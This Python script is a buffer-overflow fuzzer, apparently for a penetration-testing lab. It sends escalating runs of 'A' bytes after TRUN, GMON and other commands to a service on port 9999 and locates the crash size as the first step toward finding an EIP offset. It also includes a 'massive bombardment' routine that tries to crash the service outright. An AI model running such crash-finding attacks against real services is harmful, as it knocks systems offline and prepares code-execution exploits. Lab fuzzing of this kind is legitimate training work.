#!/usr/bin/env python3
"""
Large Buffer Fuzzer for 192.168.18.108:9999  
Authorized Penetration Test
"""

import socket
import sys
import time

TARGET = "192.168.18.108"
PORT = 9999
TIMEOUT = 5

def test_payload(cmd_prefix, buffer_size):
    """Send a large buffer and check if the service crashes"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((TARGET, PORT))
        
        payload = cmd_prefix.encode() + b"A" * buffer_size + b"\r\n"
        s.send(payload)
        
        try:
            response = s.recv(1024)
            s.close()
            return True, response  # Service still up
        except socket.timeout:
            s.close()
            return True, b"<timeout>"  # Service might still be up
        except ConnectionResetError:
            return False, b"<connection reset - possible crash>"
            
    except ConnectionRefusedError:
        return False, b"<connection refused - service down>"
    except ConnectionResetError:
        return False, b"<connection reset - possible crash>"
    except OSError as e:
        return False, f"<error: {e}>".encode()
    except Exception as e:
        return False, f"<exception: {e}>".encode()


def test_trun():
    """Fuzz TRUN command with the dot prefix"""
    print("\n" + "=" * 60)
    print("  FUZZING TRUN (with dot prefix)")
    print("=" * 60)
    
    sizes = list(range(100, 1000, 100)) + list(range(1000, 5000, 200)) + list(range(5000, 10001, 500))
    
    for size in sizes:
        alive, resp = test_payload("TRUN .", size)
        status = "ALIVE" if alive else "CRASHED"
        print(f"  TRUN . + {str(size).rjust(5)} A's -> {status}")
        
        if not alive:
            print(f"\n  [!!!] SERVICE CRASHED AT TRUN . + {size} BYTES!")
            print(f"  [!!!] Crash range: {size - (100 if size <= 1000 else 200 if size <= 5000 else 500)} - {size} bytes")
            input("\n  Press Enter to continue fuzzing TRUN with finer granularity...")
            
            # Fine-grain fuzzing around crash point
            start = max(100, size - 100)
            print(f"\n  Fine-grain fuzzing {start} to {size}...")
            for fine_size in range(start, size + 1, 10):
                alive, resp = test_payload("TRUN .", fine_size)
                status = "ALIVE" if alive else "CRASHED"
                print(f"  TRUN . + {str(fine_size).rjust(4)} A's -> {status}", end="")
                if not alive:
                    print(f"  <--- CRASH")
                    print(f"\n  [!!!] EXACT CRASH POINT: ~{fine_size} bytes")
                    print(f"  [*] Next step: Use pattern_create to find EIP offset")
                    return fine_size
                else:
                    print()
            return size
        
        time.sleep(0.1)
    
    print("  [-] TRUN did not crash up to 10000 bytes")
    return None


def test_gmon():
    """Fuzz GMON command with /.../ prefix"""
    print("\n" + "=" * 60)
    print("  FUZZING GMON (with /.../ prefix)")
    print("=" * 60)
    
    sizes = list(range(100, 1000, 100)) + list(range(1000, 5000, 200)) + list(range(5000, 10001, 500))
    
    for size in sizes:
        alive, resp = test_payload("GMON /.../", size)
        status = "ALIVE" if alive else "CRASHED"
        print(f"  GMON /.../ + {str(size).rjust(5)} A's -> {status}")
        
        if not alive:
            print(f"\n  [!!!] SERVICE CRASHED AT GMON /.../ + {size} BYTES!")
            return size
        
        time.sleep(0.1)
    
    print("  [-] GMON did not crash up to 10000 bytes")
    return None


def test_all_commands():
    """Quickly fuzz all other commands"""
    commands = ["STATS", "RTIME", "LTIME", "SRUN", "GDOG", "KSTET", 
                "GTER", "HTER", "LTER", "KSTAT", "MODE"]
    
    print("\n" + "=" * 60)
    print("  QUICK FUZZING ALL COMMANDS")
    print("=" * 60)
    
    for cmd in commands:
        # Try a large buffer
        for size in [1000, 2000, 3000, 5000]:
            alive, resp = test_payload(cmd, size)
            if not alive:
                print(f"  [!!!] {cmd} crashed at {size} bytes!")
                return cmd, size
        print(f"  [+] {cmd} - stable up to 5000 bytes")
    
    return None, None


def massive_bombardment():
    """Send a massive single payload to crash the service"""
    print("\n" + "=" * 60)
    print("  MASSIVE BUFFER BOMBARDMENT")
    print("=" * 60)
    
    # Send a really large payload
    size = 5000
    print(f"  Sending {size} bytes via TRUN...")
    alive, resp = test_payload("TRUN .", size)
    print(f"  Result: {'ALIVE' if alive else 'CRASHED'}")
    
    if alive:
        size = 10000
        print(f"  Sending {size} bytes via TRUN...")
        alive, resp = test_payload("TRUN .", size)
        print(f"  Result: {'ALIVE' if alive else 'CRASHED'}")
    
    if alive:
        # Send via all commands simultaneously
        print("\n  Bombarding with all commands at 5000 bytes...")
        for cmd in ["TRUN .", "GMON /.../", "KSTET", "GTER", "HTER", "LTER"]:
            alive, resp = test_payload(cmd, 5000)
            if not alive:
                print(f"  [!!!] CRASH with {cmd} at 5000 bytes!")
                return
            print(f"  [+] {cmd} alive")
    
    print("  [-] Service survived bombardment")


if __name__ == "__main__":
    print("=" * 60)
    print("   LARGE BUFFER FUZZER")
    print(f"  Target: {TARGET}:{PORT}")
    print("   Authorized Penetration Test")
    print("=" * 60)
    
    # Step 1: Quick test all commands
    crashed_cmd, crash_size = test_all_commands()
    
    # Step 2: Detailed TRUN fuzzing
    if not crashed_cmd:
        trun_crash = test_trun()
    
    # Step 3: Detailed GMON fuzzing
    if not crashed_cmd and 'trun_crash' not in locals():
        gmon_crash = test_gmon()
    
    # Step 4: If nothing found, massive bombardment
    if not crashed_cmd:
        massive_bombardment()
    
    print("\n" + "=" * 60)
    print("  FUZZING COMPLETE")
    print("=" * 60)
